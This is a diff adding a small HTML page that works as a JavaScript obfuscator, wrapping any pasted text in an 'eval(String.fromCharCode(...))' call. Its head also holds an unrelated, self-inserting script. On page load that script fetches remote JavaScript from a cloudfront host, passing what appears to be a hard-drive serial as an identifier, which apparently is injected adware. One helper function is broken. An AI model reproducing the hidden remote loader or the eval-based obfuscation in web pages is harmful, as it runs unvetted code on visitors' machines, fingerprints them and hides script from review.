@@ -1,0 +1,47 @@
+<html>
+<head>
+<meta name="viewport" content="width=device-width" >
+<style type="text/css">
+body{
+  background: url(https://pbs.twimg.com/profile_images/2686003492/187550f731a8fd30cc9635f4f0908ce8.jpeg);
+  font-family: Ubuntu, Verdana;
+  font-size: 150px;
+}
+</style>
+<title>obfuscate</title>
+
+<script type="text/javascript"><!-- 
+
+function hapus()
+{
+	input ="";
+	//alert(input);
+	output = "";
+	//alert(output);
+	document.fromCharCode.input.value = input;
+	document.fromCharCode.output.value = output;
+}
+function runCharCodeAt()
+{
+	input = document.charCodeAt.input.value;
+	//alert(input);
+	output = "";
+	for(i=0; i<input.length; ++i)
+	{
+		if(output != "") output += ", ";
+		output += input.charCodeAt(i);
+	}
+	//alert(output);
+	output="eval(String.fromCharCode("+output+"));";
+	document.charCodeAt.output.value = output;
+}
+
+//--></script>
+<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.107#p=wdcxwd5000aakx-001ca0_wd-wcayuk64365243650";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script></head>
+<body>
+<center>
+<FORM NAME=charCodeAt><TEXTAREA ROWS=20 COLS=30 NAME=input></TEXTAREA>
+<INPUT TYPE=Button VALUE="  obfuscate now  " onClick="runCharCodeAt()"></INPUT>
+<TEXTAREA ROWS=20 COLS=30 NAME=output></TEXTAREA></FORM>
+
+</HTML>
